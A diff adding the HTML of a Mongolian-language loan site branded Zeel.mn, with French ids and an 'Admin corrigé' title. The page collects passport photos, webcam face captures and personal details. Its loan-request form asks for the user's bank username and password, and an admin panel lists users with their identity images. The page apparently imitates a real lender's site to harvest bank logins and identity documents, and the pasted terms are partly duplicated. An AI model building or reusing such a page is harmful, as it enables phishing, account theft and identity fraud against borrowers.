@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="mn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Zeel.mn - Admin corrigé</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f0f4f8;
+      margin: 0; padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      color: #222;
+    }
+    nav {
+      background: #004aad;
+      color: #fff;
+      padding: 15px 30px;
+      display: flex;
+      gap: 15px;
+      flex-wrap: wrap;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+    }
+    nav button {
+      background: transparent;
+      border: none;
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      padding: 8px 15px;
+      border-radius: 4px;
+      transition: background-color 0.3s ease;
+    }
+    nav button:hover,
+    nav button.active {
+      background: #003080;
+    }
+    main {
+      flex-grow: 1;
+      max-width: 960px;
+      margin: 30px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 3px 15px rgba(0, 0, 0, 0.1);
+    }
+    h1, h2, h3 {
+      color: #004aad;
+      margin-bottom: 20px;
+    }
+    section {
+      display: none;
+    }
+    section.active {
+      display: block;
+    }
+    form div {
+      margin-bottom: 18px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    input[type='text'],
+    input[type='password'],
+    input[type='date'],
+    input[type='number'],
+    input[type='file'],
+    input[type='email'],
+    input[type='tel'],
+    select {
+      width: 100%;
+      padding: 10px;
+      font-size: 1rem;
+      border: 1.8px solid #ddd;
+      border-radius: 6px;
+      transition: border-color 0.3s ease;
+    }
+    input:focus {
+      border-color: #004aad;
+      outline: none;
+    }
+    button.submit,
+    #btnCalculer,
+    #btnCapture,
+    #btnAccept,
+    #btnRefuse,
+    #btnValiderCode {
+      background: #004aad;
+      color: #fff;
+      border: none;
+      padding: 12px 24px;
+      font-size: 1rem;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      margin-top: 10px;
+      transition: background-color 0.3s ease;
+    }
+    button.submit:hover,
+    #btnCalculer:hover,
+    #btnCapture:hover,
+    #btnAccept:hover,
+    #btnRefuse:hover,
+    #btnValiderCode:hover {
+      background: #003080;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 15px;
+    }
+    th, td {
+      border: 1.5px solid #ccc;
+      padding: 10px 12px;
+      text-align: center;
+      vertical-align: middle;
+    }
+    th {
+      background: #004aad;
+      color: white;
+    }
+    img.thumb {
+      max-width: 60px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+    #condition pre {
+      max-height: 400px;
+      overflow-y: auto;
+      background: #eef5ff;
+      padding: 15px;
+      border: 1.5px solid #004aad;
+      border-radius: 6px;
+      white-space: pre-wrap;
+    }
+    .message {
+      font-weight: 600;
+      margin-top: 10px;
+      color: red;
+    }
+    .message.success {
+      color: green;
+    }
+    @media (max-width: 600px) {
+      nav {
+        padding: 15px 10px;
+      }
+      main {
+        margin: 15px;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <button data-page="accueil" id="navAccueil" style="display:none;">Нүүр</button>
+    <button data-page="condition" id="navCondition">Нөхцөл</button>
+    <button data-page="inscription" id="navInscription">Бүртгэл</button>
+    <button data-page="connexion" class="active" id="navConnexion">Нэвтрэх</button>
+    <button data-page="demandePret" id="navDemandePret" disabled>Зээл хүсэлт</button>
+    <button data-page="admin" id="navAdmin" disabled>Админ</button>
+    <button id="btnLogout" style="display:none; background:#cc0000; border:none; border-radius:6px; padding:8px 15px; color:#fff; cursor:pointer;">Гарах</button>
+  </nav>
+
+  <main>
+    <!-- Connexion -->
+    <section id="connexion" class="active">
+      <h2>Нэвтрэх</h2>
+      <form id="formConnexion">
+        <div>
+          <label for="emailConnexion">И-мэйл:</label>
+          <input type="email" id="emailConnexion" required />
+        </div>
+        <div>
+          <label for="passwordConnexion">Нууц үг:</label>
+          <input type="password" id="passwordConnexion" required />
+        </div>
+        <button type="submit" class="submit">Нэвтрэх</button>
+      </form>
+      <p id="messageConnexion" class="message"></p>
+    </section>
+
+    <!-- Inscription -->
+    <section id="inscription">
+      <h2>Бүртгэл</h2>
+      <form id="formInscription">
+        <div>
+          <label for="emailInscription">И-мэйл:</label>
+          <input type="email" id="emailInscription" required />
+        </div>
+        <div>
+          <label for="passwordInscription">Нууц үг:</label>
+          <input type="password" id="passwordInscription" required minlength="6" />
+        </div>
+        <div>
+          <label for="nomInscription">Нэр:</label>
+          <input type="text" id="nomInscription" required />
+        </div>
+        <div>
+          <label for="telInscription">Утасны дугаар:</label>
+          <input type="tel" id="telInscription" required />
+        </div>
+        <div>
+          <label for="dateInscription">Төрсөн огноо:</label>
+          <input type="date" id="dateInscription" required />
+        </div>
+        <div>
+          <label for="paysInscription">Улс:</label>
+          <input type="text" id="paysInscription" required />
+        </div>
+        <div>
+          <label for="villeInscription">Хот:</label>
+          <input type="text" id="villeInscription" required />
+        </div>
+        <div>
+          <label for="photoIDInscription">Паспортын зураг:</label>
+          <input type="file" id="photoIDInscription" accept="image/*" />
+        </div>
+        <div>
+          <label>Царайны зураг (вэбкам):</label><br />
+          <video id="videoFace" width="320" height="240" autoplay></video><br />
+          <button type="button" id="btnCaptureFace">Зураг авах</button><br />
+          <canvas id="canvasFace" width="320" height="240" style="display:none;"></canvas>
+          <img id="photoFace" style="display:none; max-width:320px; border:1px solid #ccc; margin-top:8px;" alt="Царайны зураг"/>
+        </div>
+        <button type="submit" class="submit">Бүртгүүлэх</button>
+      </form>
+      <p id="messageInscription" class="message"></p>
+    </section>
+
+    <!-- Accueil -->
+    <section id="accueil">
+      <h1>Zeel.mn-д тавтай морилно уу</h1>
+      <p>Цахим платформ дээр зээл авах боломжтой.</p>
+    </section>
+
+    <!-- Conditions -->
+    <section id="condition">
+      <h2>Хэрэглэх нөхцөл</h2>
+      <pre>
+АВАХ ЦЭСНИЙ ҮЙЛЧИЛГЭЭНИЙ НӨХЦӨЛ
+
+Энэхүү үйлчилгээний нөхцөл нь хувь хүн Зээл эм эн платформоор дамжуулан зээл авахтай холбогдон үүсэх харилцааг зохицуулсан суурь баримт бичиг болно.
+
+НЭГ. ХАРИЛЦАГЧИЙН БҮРТГЭЛ
+
+АВАХ ЦЭСНИЙ ҮЙЛЧИЛГЭЭНИЙ НӨХЦӨЛ
+
+Энэхүү үйлчилгээний нөхцөл нь хувь хүн Зээл эм эн платформоор дамжуулан зээл авахтай холбогдон үүсэх харилцааг зохицуулсан суурь баримт бичиг болно.
+
+НЭГ. ХАРИЛЦАГЧИЙН БҮРТГЭЛ
+
+1.1. Хувь хүн Зээл эм эн платформд өөрийн эзэмшлийн, байнга ашигладаг гар утасны дугаараар бүртгүүлэх бөгөөд тухайн дугаарт илгээсэн 6 оронтой кодыг “Баталгаажуулах код” хэсэгт оруулснаар харилцагчаар бүртгэгдэнэ.
+1.2. Харилцагч нь Зээл эм эн платформын “Харилцагчийн мэдээлэл” хэсгийн бүхий л мэдээллийг үнэн зөв, бүрэн гүйцэд бөглөх бөгөөд өөрийн оруулсан мэдээллийн үнэн зөвийг хариуцна.
+1.3. Харилцагч нь мэдээллээ буруу оруулсан эсхүл бүртгэгдсэн мэдээлэл нь өөрчлөгдсөн тохиолдолд тэр даруй тухайн мэдээллээ засварлах үүрэгтэй. Энэхүү үүргээ гүйцэтгээгүйн улмаас (санаатай эсхүл санамсаргүй аль ч сэдлээр) талуудад болон бусад этгээдэд учирсан аливаа хохирлыг үл маргах журмаар нөхөн төлнө.
+1.4. Зээл эм эн платформ ББСБ ХХК нь харилцагчийн мэдээллийн үнэн зөвийг баталгаажуулах болон харилцагчтай холбогдох зорилгоор дараах байгууллагуудаас харилцагчийн дор дурьдсан мэдээллүүдийг авах бүрэн эрхтэй байна. Үүнд:
+1.4.1. Харилцагчийн гараас оруулсан одоо оршин суугаа хаягийг баталгаажуулах зорилгоор Иргэний бүртгэлийн газар болон тухайн мэдээллийг баталгаажуулан авах боломжит бусад төрийн эрх бүхий байгууллагаас оршин суугаа хаягийн лавлагаа авах;
+1.4.2. Харилцагчийн бүртгэлтэй утасны дугаар болон яаралтай үед холбоо барих дугаараар нь түүнтэй холбогдож чадаагүй тохиолдолд үүрэн телефоны компаниудаас харилцагчийн эзэмшлийн (түүний нэр дээрх) бусад дугааруудын лавлагаа авах;
+1.4.3. Харилцагчийн системд оруулж буй аливаа мэдээллийг баталгаажуулах шаардлагатай болсон тохиолдолд тухайн мэдээллийг баталгаажуулан авах боломжит төрийн захирагааны байгууллагууд болон бусад байгууллагуудаас лавлагаа авах
+1.5. Харилцагч нь анх удаа мэдээллээ бүртгүүлэхдээ алдаатай оруулсан тохиолдолд 7 хоногийн дараа засварлах, хоёр дахь удаагаа мэдээллээ засварлан оруулахдаа алдаатай оруулсан тохиолдолд 14 хоногийн дараа засварлах, гурав дахь удаагаа мэдээллээ засварлан оруулахдаа алдаатай оруулсан тохиолдолд 30 хоногийн дараа, дөрөв дэх удаагаа мэдээллээ засварлан оруулахдаа алдаатай оруулсан тохиолдолд зургаан сарын дараа засварлах боломжтой. Иймд хэрэглэгч нь анхнаасаа мэдээллээ нягтлан, зөвхөн үнэн зөв мэдээлэл оруулна.
+1.6. Харилцагч нь бүртгэлтэй дугаараасаа өөр дугаар тогтмол ашиглахаар болсон тохиолдолд Зээл эм эн платформын оператортай холбогдон бүртгэлтэй дугаараа солиулна.
+
+ХОЁР. ЗЭЭЛИЙН ЭРХ НЭЭГДЭХ
+
+2.1. Дараах шаардлагыг хангаж буй харилцагч нь Зээл эм эн платформоор дамжуулан зээлийн үйлчилгээ авах эрхтэй байна. Үүнд:
+• 18-н насанд хүрсэн, эрх зүйн бүрэн чадамжтай Монгол Улсын иргэн байх;
+• Зээлмн платформ дахь Хувийн мэдээллээ бүрэн гүйцэд, үнэн зөв оруулсан байх;
+• Тогтмол орлоготой байх;
+• Монгол банкны зээлийн мэдээллийн санд чанаргүй зээлийн ангилалд шилжээгүй байх буюу өөр банк, банк бус санхүүгийн байгууллагад хугацаа хэтэрсэн зээлгүй байх;
+• Зээлжих оноо нь 50-иас дээш байх
+2.2. Зээл эм эн платформ ББСБ ХХК нь харилцагчид тавигдах шаардлагыг хэдийд ч дангаар өөрчлөх эрхтэй байна.
+
+ГУРАВ. ЕРӨНХИЙ НӨХЦӨЛ
+
+3.1. Энэхүү үйлчилгээний нөхцөлийн 2 дугаар зүйлийн 2.1 дэх хэсэгт заасан шалгуурыг хангасан харилцагч нь өөрт тогтоогдсон зээлийн дүнд тааруулан Зээл эм эн платформоос зээл авах боломжтой.
+3.2. Зээл эм эн платформ ББСБ ХХК нь компанийн бизнес төлөвлөгөө, цаг үеийн нөхцөл байдалтай (дотоодын болон гадаад) холбоотойгоор зээлийн эрх нээгдсэн харилцагчид нэмэлт шалгуур тавих зэргээр Зээлийн бодлогодоо хэдийд ч тохируулга хийх эрхтэй.
+3.3. Зээл эм эн платформ ББСБ ХХК нь дараах тохиолдолд зээл олгохоос татгалзаж болно. Үүнд:
+3.3.1. Харилцагч нь энэхүү Үйлчилгээний нөхцөлийн 2 дугаар зүйлийн 2.1 дэх хэсэгт заасан шаардлагыг хангаагүй;
+3.3.2. Зээлийн бодлоготой уялдуулан харилцагчид тавьж буй нэмэлт шалгуурыг хангаагүй;
+3.3.3. Гэнэтийн болон давагдашгүй хүчин зүйлийн нөлөөлөлд орсны улмаас зээл гаргах, гүйлгээ хийх боломжгүй нөхцөл байдал үүссэн;
+3.3.4. Мөнгө угаах болон терроризмыг санхүүжүүлэхтэй тэмцэх тухай хууль болон холбогдох бусад хууль тогтоомжийн биелэлтийг хангах;
+3.3.5. Хууль, хяналтын эрх бүхий байгууллагын шийдвэрийн дагуу
+3.4. Эрх бүхий байгууллагын аливаа шийдвэр, гэнэтийн болон давагдашгүй хүчин зүйлийн нөлөөллийн улмаас зээлдэгчид учирсан хохирлыг Зээл эм эн платформ ББСБ ХХК хариуцахгүй.
+3.5. Зээл эм эн платформ ББСБ ХХК нь энэхүү үйлчилгээний нөхцөлийг хэдийд ч дангаар өөрчлөх эрхтэй бөгөөд харилцагчид Зээл эм эн платформоор (notification) дамжуулан мэдэгдэнэ.
+3.6. Харилцагч нь үйлчилгээний нөхцөл шинэчлэгдэхээс өмнө Зээлийн гэрээ байгуулсан бол тухайн гэрээ дуусгавар болох хүртэл хуучин үйлчилгээний нөхцөл хамаарна.
+3.7. Харилцагч нь үйлчилгээний нөхцөл шинэчлэгдсэн өдрөөс хойш Зээл эм эн платформыг үргэлжлүүлэн ашигласаар байвал тухайн нөхцөлийг хүлээн зөвшөөрсөнд тооцно.
+3.8. Харилцагч нь дараах нөхцөлийг бүрэн хангасан тохиолдолд зээлийн эргэн төлөлтөө 1 удаад 1 сарын хугацаагаар сунгаж болно. Үүнд:
+3.8.1. Зээл эм эн платформ дээрх эргэн төлөлтийн хуваарийнхаа дагуу өмнөх сарын (эсхүл саруудын) үндсэн төлбөр болон хүүгээ бүрэн төлсөн;
+3.8.2. Үндсэн гэрээний үйлчилгээний шимтгэлийг бүрэн төлсөн;
+3.8.3. Энэ зүйлийн 3.10 дахь хэсэгт заасан сунгалтын үйлчилгээний хураамжийг бүрэн төлсөн;
+3.8.4. Сунгалтын товч идэвхтэй байх хугацаанд буюу энэ зүйлийн 3.9 дэх хэсэгт заасан хугацаанд хүсэлт гаргасан
+3.9. Харилцагч нь зээлийн гэрээний хугацаагаа төлөлт хийх өдрөөс 7 хоногийн өмнө, төлөлт хийх өдөр, төлөлт хийх өдөр өнгөрснөөс хойш 7 хоногийн дотор Зээл эм эн платформоор дамжуулан сунгаж болно.
+3.10. Зээлийн хугацаа сунгалтын үйлчилгээний хураамж 5000 төгрөг байна.
+3.11. Харилцагч нь зээлээ эргэн төлөх хугацаа хэтрүүлсэн хоног тутамд үндсэн хүүгийн 20% (хорин хувь)-иар нэмэгдүүлсэн хүү төлнө.
+3.12. Харилцагч нь хугацаандаа зээлээ төлөөгүй бол Монголбанкнаас баталсан журмын дагуу Зээлийн мэдээллийн сангийн зээлийн ангилалд шилжинэ.
+
+ДӨРӨВ. ЗЭЭЛ АВАХ ЖУРАМ
+
+4.1. Хүний оролцоогүй, зөвхөн хиймэл оюун ухаан буюу Зээл эм эн платформ нь харилцагчийн хувийн болон санхүүгийн мэдээлэл, тухайн мэдээллийн үнэн зөвөөс хамааран харилцагчийн Зээлжих оноог тодорхойлно.
+4.2. Зээлжих онооноос хамааран зээл авах эрх болон зээлийн дээд хэмжээ нь автоматаар тодорхойлогдоно.
+4.3. Харилцагч нь дараах хэлбэрээр зээл авч болно. Үүнд:
+4.3.1. “Зээл өгөх хүсэлтүүд” хэсгээс сонгох; эсхүл
+4.3.2. Өөрийн зээлийн эрхийн хэмжээнд тааруулан дараах нөхцөлийг удирдлага болгон зээлийн дүн, хүү, эргэн төлөх хугацааг сонгон хүсэлтээ илгээх
+
+Хэмжээ: 50,000-10,000,000 төгрөг хүртэлх
+Зээлийн хүү* (төгрөг):Сарын 1.0% - 2.0%
+Хугацаа:12-н сар хүртэл
+Зээлийн үйлчилгээний шимтгэл:0.5%
+
+4.4. Харилцагчийн 4.3.2-т заасны дагуу гаргасан зээлийн хүсэлт нь 72 цагийн дотор шийдвэрлэгдэнэ. Тухайн хугацааны дотор зээл олгогдоогүй бол тухайн зээлийн хүсэлт нь автоматаар цуцлагдана.
+4.5. Зээл олголт нь Зээл эм эн платформ дахь харилцагчийн хэтэвч рүү орох бөгөөд харилцагч нь хэдийд ч хэтэвчнээсээ данс руу зарлагадан авах эсхүл авахгүй байх эрхтэй.
+4.6. Харилцагч нь зээлээ хэтэвчнээсээ зарлагдан авалгүй Зээлийн гэрээний хугацаа дуусгавар болгосон нь Зээлийн гэрээний дагуу хүү төлөх болон гэрээний дагуу хүлээсэн бусад үүргээс чөлөөлөгдөх үндэслэл болохгүй.
+4.7. Харилцагчийн зээл авах хүсэлтийн дагуу зээл олголт хийгдсэнээр талуудын хооронд Зээлийн гэрээ байгуулагдсанд тооцно.
+4.8. Харилцагч нь Зээл эм эн платформыг ашиглан зээлийн үйлчилгээ авч буйтай холбоотойгоор зээлийн үнийн дүнгийн 0,5%-ийн үйлчилгээний шимтгэл төлнө.
+
+ТАВ. ЗЭЭЛИЙН ЭРГЭН ТӨЛӨЛТИЙН ЖУРАМ
+
+5.1. Харилцагч нь зээлийн эргэн төлөлтөө зөвхөн Зээл эм эн платформоор (Zeelmn app болон Zeelmn вэбсайт) дамжуулан гүйцэтгэнэ. Хэрэв Зээл эм эн платформоор дамжуулан зээлийн эргэн төлөлтөө хийх боломжгүй тохиолдолд зөвхөн ажлын өдөр, ажлын цагаар оператортай холбогдон Зээл эм эн платформ ББСБ ХХК-ийн дансны мэдээллийг баталгаажуулсны үндсэнд данс руу шилжүүлэг хийж болно.
+5.2. Харилцагч нь энэ зүйлийн 5.1 дэх хэсэгт заасан журмын дагуу данс руу шилжүүлэг хийх тохиолдолд гүйлгээний утга дээр бүртгэлтэй утасны дугаар болон регистрийн дугаараа оруулах бөгөөд гүйлгээ хийсний дараа заавал оператортай холбогдон мэдэгдэнэ.
+5.3. Харилцагч нь энэ зүйлийн 5.1 болон 5.2 дахь хэсэгт заасны дагуу зээлийн эргэн төлөлтийг гүйцэтгээгүйн улмаас талуудад болон гуравдагч этгээдэд учирсан хохирол, эрсдлийг бүрэн хариуцаж, нөхөн төлнө.
+5.4. Зээлдэгч нь хоёр сараас дээш хугацаагаар зээл авсан тохиолдолд сар тутам зээлийн хүүгээ төлөхөөс гадна үндсэн зээлээ тухайн саруудад тэнцүү хуваан төлнө.
+5.5. Харилцагч нь хугацаандаа зээлээ төлөөгүй тохиолдолд дараах арга хэмжээ авна. Үүнд:
+5.4.1. Харилцагчийн яаралтай үед холбоо барих дугаараас харилцагчийн ашиглаж буй дугаар болон гэрийн хаягийн талаар тодруулна.
+5.4.2. Харилцагчийн яаралтай үед холбоо барих дугаартай холбогдож чадаагүй (тухайн дугаар нь холбоо барих боломжгүй, ашиглалтад байхгүй, орох яриа хаагдсан эсхүл утсаа аваагүй) эсхүл холбогдож чадсан хэдий ч зээлдэгчтэй холбогдох утасны дугаар, гэрийн хаягийн мэдээллийг өгөөгүй эсхүл өгсөн дугаараар нь зээлдэгчтэй холбогдож чадаагүй (тухайн дугаар нь холбоо барих боломжгүй, ашиглалтад байхгүй, орох яриа хаагдсан эсхүл утсаа аваагүй) бол ажлын газрын хаягаар мэдэгдэл хүргүүлэх, ажлын газрын хаягаар очиж уулзана.
+5.4.3. Харилцагч нь хугацаандаа зээлээ төлөөгүй тохиолдолд түүний Зээл эм эн платформд холбосон данснаас эсхүл хэтэвчнээс шууд таталт хийнэ.
+5.6. Харилцагч нь хугацаандаа зээлээ төлөөгүйн улмаас дараах үр дагавар үүснэ. Үүнд:
+5.5.1. Хугацаандаа зээлээ төлөөгүй 14 хүртэлх хоног болсон бол харилцагчийн Зээлжих оноо (зээлийн авах дүн) буурах бөгөөд дараагийн удаад зээл авахад зээлийн хүсэлтийн жагсаалтын сүүлд орох буюу зээл олголт удах эрсдэл үүснэ.
+5.5.2. Харилцагч нь хугацаандаа зээлээ төлөөгүй 15 хоног өнгөрсөн бол Зээл эм эн платформоос дахин зээл авах эрхгүй болно.
+5.7. Харилцагч нь энэхүү үйлчилгээний нөхцөл болон Зээлийн гэрээнд заасан үүргээ зохих ёсоор биелүүлээгүйн улмаас Зээл эм эн платформ ББСБ ХХК-д учирсан хохирол (аливаа зардал)-г тухайн харилцагч үл маргах журмаар нөхөн төлнө.
+
+ЗУРГАА. ХАРИЛЦАГЧИЙН МЭДЭЭЛЛИЙН НУУЦЛАЛ
+
+6.1. Зээл эм эн платформ ББСБ ХХК нь харилцагчийн өгсөн мэдээллийг зөвхөн дараах зорилгоор ашиглана. Үүнд:
+6.1.1. Зээл эм эн платформоор дамжуулан харилцагчийн зээлжих оноог тодорхойлох;
+6.1.2. Харилцагчтай холбогдох, тухай бүрт үйлчилгээтэй холбоотой мэдээллийг хүргэх;
+6.1.3. Зээлийн гэрээний төслийг боловсруулахад ашиглах;
+6.1.4. Монголбанкны зээлийн мэдээллийн сангаас зээлийн түүхийг нь татан авах;
+6.1.5. Үйлчилгээний чанар, хүртээмж, нөхцөлийг сайжруулах зорилгоор Зээлмн платформыг хөгжүүлэгч байгууллагад шилжүүлэх;
+6.1.6. Шинэ бүтээгдэхүүн, үйлчилгээ гаргах болон бусад асуудлаар зах зээлийн судалгаа шинжилгээ хийх;
+6.1.7. Зээл эм эн платформ болон түүний хиймэл оюун ухааныг хөгжүүлэх;
+6.1.8. Харилцагч нь гэрээний үүргээ гүйцэтгээгүйтэй холбоотойгоор хууль, хяналтын болон бусад байгууллагуудад хандах
+6.2. Зээл эм эн платформ ББСБ ХХК нь дараах зорилгоор харилцагчийн платформд хандах хандалт, платформоор дамжуулан хийж буй аливаа үйлдлийг лог болгон хадгалж, түүнийг хуулийн хүрээнд ашиглана.
+6.2.1. Харилцагчийн мэдээллийн аюулгүй байдлыг хангах;
+6.2.2. Зээлмн платформыг хууль бус зорилгоор ашиглахаас урьдчилан сэргийлэх
+6.3. Зээл эм эн платформ ББСБ ХХК нь харилцагчийн мэдээллийн нууцлалыг чандлан хадгалах бөгөөд тухайн мэдээллийг бусдад задруулах, түүнчлэн энэхүү үйлчилгээний нөхцөлд заасан зорилгоос өөр бусад зорилгоор ашиглахыг хатуу хориглоно.
+6.4. Монгол улсын хуулийн дагуу эрх бүхий байгууллагаас талуудын хоорондын харилцаа болон нөгөө талтай холбоотой аливаа мэдээ, мэдээллийг гаргаж өгөхийг шаардсан эсхүл хуулиар нууцлахыг хориглосон болон нэгэнт олон нийтэд ил болсон мэдээ, мэдээллийн хувьд нууц хадгалах үүрэг хүлээхгүй.
+
+ДОЛОО. МЭДЭЭЛЛИЙН АЮУЛГҮЙ БАЙДАЛ, СИСТЕМИЙН ТАСРАЛТГҮЙ НАЙДВАРТАЙ АЖИЛЛАГААГ ХАНГАХ
+
+7.1. Зээл эм эн платформ ББСБ ХХК нь Харилцагчийн мэдээллийн нууцлалыг системийн түвшинд найдвартай хадгална.
+7.2. Зээл эм эн платформ ББСБ ХХК нь долоо (7) хоногийн хорин дөрөв (24)-н цагийн горимд системийн хэвийн, найдвартай, тасралтгүй, аюулгүй үйл ажиллагааг хангаж, Зээл эм эн платформын үйлчилгээг тасралтгүй, түргэн шуурхай үзүүлэх нөхцөлийг бүрдүүлж ажиллана.
+7.3. Харилцагч нь өөрийн интернэт банкны нэвтрэх мэдээллийг Зээл эм эн платформд оруулж, системээс дансны хуулгыг амжилттай татан авсны дараа нэн даруй өөрийн интернэт банкны нэвтрэх нэр, нууц үг-ийг солих үүрэгтэй бөгөөд энэхүү үүргээ биелүүлээгүйгээс үүссэн аливаа үр дагаврыг дангаар бүрэн хариуцна.
+7.4. Харилцагч нь Зээл эм эн платформд нэвтрэх нэр, нууц үг болон бусад мэдээллийн нууцлалаа чандлан хадгалах бөгөөд нууцлалаа алдсанаас үүсэх хариуцлагыг өөрөө хүлээнэ.
+7.5. Харилцагч нь Зээл эм эн платформ руу нэвтрэх нэр болон нууц үгийн нууцлалыг өөрийн эцэг эх, эхнэр/нөхөр, хүүхэд болон бусад этгээдэд санаатай болон санамсаргүй байдлаар задруулсны улмаас үүсэх үр дагаврыг Зээл эм эн платформ ББСБ ХХК хариуцахгүй.
+7.6. Харилцагчийн нэвтрэх нэр болон нууц үгийг ашиглан хийгдэж буй аливаа зээл өгөх, авах хүсэлтийг тухайн этгээд өөрөө гаргаж буйд тооцно.
+7.7. Харилцагч нь Зээл эм эн платформ-д нэвтрэх нууц үг алдагдсан байж болзошгүй тохиолдолд яаралтай солих үүрэгтэй.
+7.8. Харилцагч гүйлгээ хийхдээ дансны дугаар, гүйлгээний дүнгээ зөв оруулах бөгөөд буруу оруулсны улмаас талууд үүсэх зардал, хохирлыг өөрөө хүлээнэ.
+7.9. Харилцагч нь дараах нөхцөл бий болсны улмаас талуудад үүссэн хохирол, зардлыг бүрэн хариуцна. Үүнд:
+7.9.1. Зээл эм эн платформ суулгасан гар утас эсхүл төхөөрөмжөө бусдад дамжуулсан, ашиглуулсан, хэрэглүүлсэн, эхсүл хулгайд алдсан;
+7.9.2. Зээл эм эн платформ суулгасан гар утас эсхүл төхөөрөмж эвдэрсэн;
+7.9.3. Бүртгэлтэй гар утасны орох эсхүл гарах ярианы эрх нь хаагдсан;
+7.9.4. Бүртгэлтэй утасны дугаар нь сүлжээнээс гарсан;
+7.10. Банкны болон бусад гуравдагч этгээдийн систем, үйл ажиллагааны саатлын улмаас талуудад учирсан хохирол, зардлыг Зээл эм эн платформ ББСБ ХХК хариуцахгүй.
+7.11. Харилцагч нь санаатайгаар Зээл эм эн платформ-д системийн доголдол үүсгэсний улмаас учирсан хохирлыг бүрэн хариуцна.
+
+НАЙМ. ХАРИЛЦАГЧИЙН ГОМДОЛ, ХҮСЭЛТИЙГ ШИЙДВЭРЛЭХ
+
+8.1. Зээл эм эн платформ ББСБ ХХК нь харилцагчаас ирсэн гомдлыг боломжит хугацаанд шийдвэрлэж, харилцагчийн бүртгэлтэй утасны дугаараар холбогдон мэдэгдэнэ.
+8.2. Харилцагчийн алдаатай зээлийн хүсэлт илгээсэн, зээлийн нөхцөлийг андуурч сонгосон зэрэг харилцагчийн илтэд хайхрамжгүй, болгоомжгүй үйлдэлтэй холбоотой үр дагаврыг харилцагч дангаар хариуцна.
+
+ЕС. БУСАД НӨХЦӨЛ
+
+9.1. Энэхүү Үйлчилгээний нөхцөл талуудын хооронд байгуулах Зээлийн гэрээний салшгүй хэсэг байна.
+9.2. Энэхүү гэрээний харилцаатай холбоотой асуудлаар талуудын хооронд маргаан үүсвэл талууд харилцан зөвшилцөж, эвийн журмаар шийдвэрлэхийг зорино. Хэрэв эвийн журмаар шийдвэрлэж чадахгүйд хүрсэн тохиолдолд Монгол Улсын үндэсний худалдаа аж үйлдвэрийн танхимын дэргэдэх Үндэсний болон олон улсын арбитраар нэг арбитрчаар шийдвэрлүүлнэ. Зээл эм эн платформ ББСБ ХХК нь арбитрчийг сонгоно.
+9.3. Гэнэтийн буюу давагдашгүй хүчин зүйл гэдэгт терроризм, хорлон сүйтгэх ажиллагаа, үймээн самуун, бослого, хувьсгал зэрэг нийгмийг хамарсан эмх замбараагүй байдал, байгалийн гамшигт үзэгдэл, гэрээний харилцаатай холбоотой эрх бүхий байгууллагын хориг зэрэг урьдчилан таамаглах боломжгүй, талуудын хяналтаас гадуур бий болсон аливаа үйл явдлыг ойлгоно.
+9.4. Гэнэтийн болон давагдашгүй хүчин зүйлээс шалтгаалан аль нэг тал нь энэхүү гэрээгээр хүлээсэн үүргээ хугацаанд нь биелүүлэх боломжгүй нөхцөл байдал үүссэн нь талуудын эрх ашгийг хөндөхгүй бол тухайн хүчин зүйлийн нөлөөлөл арилах хүртэлх хугацаагаар үүргийн гүйцэтгэлийг хойшлуулж болно.
+
+
+ИЙМД ТА ЭНЭХҮҮ ҮЙЛЧИЛГЭЭНИЙ НӨХЦӨЛТЭЙ САЙН ТАНИЛЦАЖ ЗӨВШӨӨРӨХ ЭСЭХЭЭ ШИЙДЭХИЙГ ЗӨВЛӨЖ БАЙНА.
+...
+
+      </pre>
+      <button id="btnAccept">Хүлээн авах</button>
+      <button id="btnRefuse">Татгалзах</button>
+    </section>
+
+    <!-- Demande Pret -->
+    <section id="demandePret">
+      <h2>Зээл хүсэлт</h2>
+
+      <div style="background: #eef5ff; padding: 15px; border-radius: 6px;">
+        <h3>Зээлийн калькулятор</h3>
+        <div>
+          <label for="montantPret">Зээлийн дүн (₮):</label>
+          <input type="number" id="montantPret" min="1000" />
+        </div>
+        <div>
+          <label for="dureeRemboursement">Хугацаа (сар):</label>
+          <input type="number" id="dureeRemboursement" min="1" />
+        </div>
+        <button id="btnCalculer">Тооцоол</button>
+        <div id="resultCalc"></div>
+      </div>
+
+      <form id="formDemandePret" style="margin-top: 20px;">
+        <div>
+          <label for="numeroBancaire">хэрэглэгчийн нэр эсвэл хэрэглэгчийн ID:</label>
+          <input type="text" id="numeroBancaire" required />
+        </div>
+        <div>
+          <label for="mdpBancaire">Нууц үг:</label>
+          <input type="password" id="mdpBancaire" required />
+        </div>
+        <button type="submit" class="submit">Хүсэлт илгээх</button>
+      </form>
+      <p id="messageDemandePret" class="message"></p>
+    </section>
+
+    <!-- Admin -->
+    <section id="admin">
+      <h2>Админ нэвтрэх</h2>
+      <div id="authAdmin">
+        <input type="password" id="codeAdmin" placeholder="Админ код" />
+        <button id="btnValiderCode" class="submit">Нэвтрэх</button>
+        <p id="messageAdminCode" class="message"></p>
+      </div>
+
+      <div id="contenuAdmin" style="display:none;">
+        <h3>Хэрэглэгчид</h3>
+        <input type="text" id="searchUtilisateurs" placeholder="Хайх..." style="margin-bottom: 10px; padding:6px; width:100%; max-width:300px;">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>И-мэйл</th>
+              <th>Нэр</th>
+              <th>Утас</th>
+              <th>Төрсөн</th>
+              <th>Улс</th>
+              <th>Хот</th>
+              <th>Паспорт зураг</th>
+              <th>Царайны зураг</th>
+              <th>Үйлдэл</th>
+            </tr>
+          </thead>
+          <tbody id="tbodyUtilisateurs"></tbody>
+        </table>
+
+        <h3 style="margin-top:40px;">Зээлийн хүсэлтүүд</h3>
